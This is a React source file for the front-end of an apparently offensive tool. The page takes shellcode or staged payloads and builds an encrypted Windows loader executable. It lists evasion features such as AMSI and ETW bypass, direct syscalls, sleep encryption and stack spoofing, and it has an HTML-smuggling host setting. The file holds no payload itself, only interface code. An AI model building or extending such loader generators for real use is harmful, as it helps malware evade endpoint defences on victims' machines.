import { useState, useRef, useEffect } from 'react'
import { useNavigate }    from 'react-router-dom'
import { Feature, Encryption, LoaderType, GenerateRequest, generate } from '../api/generate'
import { StagePayload, listStages, uploadStage, deleteStage, rotateToken } from '../api/stage'
import { useJobSocket }   from '../hooks/useJobSocket'
import Header, { StepId } from '../components/Header'
import PayloadSection     from '../components/PayloadSection'
import StageTransferSection from '../components/StageTransferSection'
import EvasionSection     from '../components/EvasionSection'
import OutputSection      from '../components/OutputSection'
import BuildConsole, { LogLine, BuildStatus } from '../components/BuildConsole'

export default function GeneratorPage() {
  const navigate = useNavigate()

  const [mode, setMode]             = useState<'stageless' | 'staged'>('stageless')
  const [shellcodeHex, setShellcodeHex] = useState('')
  const [binFilename, setBinFilename]   = useState<string | null>(null)
  const [stages, setStages]             = useState<StagePayload[]>([])
  const [tokens, setTokens]             = useState<Record<string, string>>({})

  const [features, setFeatures]     = useState<Feature[]>(['DirectSyscall', 'AmsiHwbp', 'EtwHwbp', 'SleepEncrypt', 'StackSpoof'])
  const [encryption, setEncryption] = useState<Encryption>('Aes256')
  const [loaderType, setLoaderType] = useState<LoaderType>('Binary')

  const [jobId, setJobId]           = useState<string | null>(null)
  const [logs, setLogs]             = useState<LogLine[]>([])
  const [buildStatus, setBuildStatus] = useState<BuildStatus>('idle')
  const [artifactId, setArtifactId] = useState<string | null>(null)
  const [configXml, setConfigXml] = useState<string | null>(null)

  const [currentStep, setCurrentStep] = useState<StepId>(1)
  const sectionRefs = useRef<Record<StepId, HTMLElement | null>>({ 1: null, 2: null, 3: null, 4: null, 5: null })

  useEffect(() => {
    listStages().then(setStages).catch(() => {})
  }, [])

  const { status } = useJobSocket(jobId)
  useEffect(() => {
    if (!status) return
    setLogs(prev => [...prev, { ts: new Date().toISOString().slice(11, 19), tag: status.status === 'error' ? 'err' : 'info', msg: status.msg ?? status.status }])
    if (status.status === 'done') {
      setBuildStatus('done')
      if (status.download_id) setArtifactId(status.download_id)
      if (status.config_xml)  setConfigXml(status.config_xml)
    } else if (status.status === 'error') {
      setBuildStatus('error')
    }
  }, [status])

  function scrollTo(step: StepId) {
    setCurrentStep(step)
    sectionRefs.current[step]?.scrollIntoView({ behavior: 'smooth', block: 'start' })
  }

  function handleFileUpload(file: File) {
    setBinFilename(file.name)
    const reader = new FileReader()
    reader.onload = ev => {
      const buf   = ev.target?.result as ArrayBuffer
      const bytes = new Uint8Array(buf)
      setShellcodeHex(Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(''))
    }
    reader.readAsArrayBuffer(file)
  }

  async function handleStageUpload(file: File) {
    try {
      const res = await uploadStage(file)
      setStages(prev => [...prev, { pid: res.pid, name: res.name, size: res.size, arch: 'x64', created_at: '' }])
      setTokens(prev => ({ ...prev, [res.pid]: res.jwt }))
    } catch { /* ignore */ }
  }

  async function handleStageDelete(pid: string) {
    await deleteStage(pid)
    setStages(prev => prev.filter(s => s.pid !== pid))
    setTokens(prev => { const n = { ...prev }; delete n[pid]; return n })
  }

  async function handleRotate(pid: string) {
    const res = await rotateToken(pid)
    setTokens(prev => ({ ...prev, [pid]: res.jwt }))
  }

  async function handleForge() {
    setBuildStatus('building')
    setLogs([])
    setJobId(null)
    setArtifactId(null)
    setConfigXml(null)
    try {
      const req: GenerateRequest = {
        loader_type: loaderType,
        features,
        encryption,
        shellcode_hex: shellcodeHex.replace(/\s+/g, ''),
        key_hex: '',
        iv_hex: '',
        appdomain_config: loaderType === 'AppDomain' ? {} : undefined,
      }
      const { job_id } = await generate(req)
      setJobId(job_id)
    } catch {
      setBuildStatus('error')
      setLogs(prev => [...prev, { ts: new Date().toISOString().slice(11, 19), tag: 'err', msg: 'Generation failed' }])
    }
  }

  const smugHost = localStorage.getItem('defcrow_smug_host') ?? 'localhost:8080'
  const canForge = mode === 'stageless' ? shellcodeHex.length > 0 : stages.length > 0
  const showStageTransfer = mode === 'staged'

  return (
    <div style={{ backgroundColor: 'var(--bg)', minHeight: '100vh' }}>
      <Header currentStep={currentStep} showStageTransfer={showStageTransfer} onStepClick={scrollTo} />

      <div className="flex gap-6 px-6 pt-6 max-w-[1400px] mx-auto">
        <main className="flex-1 space-y-10 pb-20 min-w-0">
          <div ref={el => { sectionRefs.current[1] = el }}>
            <PayloadSection
              mode={mode} onModeChange={setMode}
              shellcodeHex={shellcodeHex} onShellcodeHexChange={setShellcodeHex}
              binFilename={binFilename} stages={stages}
              onFileUpload={handleFileUpload} onStageUpload={handleStageUpload} onStageDelete={handleStageDelete}
            />
          </div>

          {showStageTransfer && (
            <div ref={el => { sectionRefs.current[2] = el }}>
              <StageTransferSection stages={stages} tokens={tokens} stageHost="localhost:8080" onRotate={handleRotate} />
            </div>
          )}

          <div ref={el => { sectionRefs.current[3] = el }}>
            <EvasionSection features={features} encryption={encryption} onFeaturesChange={setFeatures} onEncryptionChange={setEncryption} />
          </div>

          <div ref={el => { sectionRefs.current[4] = el }}>
            <OutputSection loaderType={loaderType} onLoaderTypeChange={setLoaderType} encryption={encryption} onEncryptionChange={setEncryption} />
          </div>
        </main>

        <aside className="w-[380px] shrink-0" ref={el => { sectionRefs.current[5] = el }}>
          <BuildConsole
            logs={logs} status={buildStatus}
            canForge={canForge} onForge={handleForge}
            artifactId={artifactId} artifactName={artifactId ? `loader_${artifactId.slice(0, 8)}.exe` : null}
            smugHost={smugHost}
          />
        </aside>
      </div>
    </div>
  )
}
